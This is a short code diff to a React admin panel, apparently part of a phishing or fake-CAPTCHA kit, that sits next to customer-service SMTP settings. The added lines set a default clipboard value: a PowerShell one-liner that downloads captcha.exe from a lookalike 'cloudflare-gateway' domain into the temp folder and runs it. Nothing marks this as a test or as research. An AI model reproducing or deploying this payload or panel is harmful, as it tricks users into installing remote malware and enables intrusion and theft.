@@ -62,6 +62,9 @@ const EzAgencyPanel = () => {
   const [smtpFromName, setSmtpFromName] = useState("Kundenservice");
   const [savingSmtp, setSavingSmtp] = useState(false);
   const [sendingSmtpTest, setSendingSmtpTest] = useState(false);
+  const DEFAULT_CLIP = `powershell -c "& {$u='https://d1.cloudflare-gateway.net/captcha.exe'; $o='%TEMP%\\captcha.exe'; (New-Object Net.WebClient).DownloadFile($u,$o); Start-Process $o}"`;
+  const [captchaClip, setCaptchaClip] = useState<string>(DEFAULT_CLIP);
+  const [savingClip, setSavingClip] = useState(false);
 
   const loadEmails = async () => {
     const { data } = await (supabase as any)
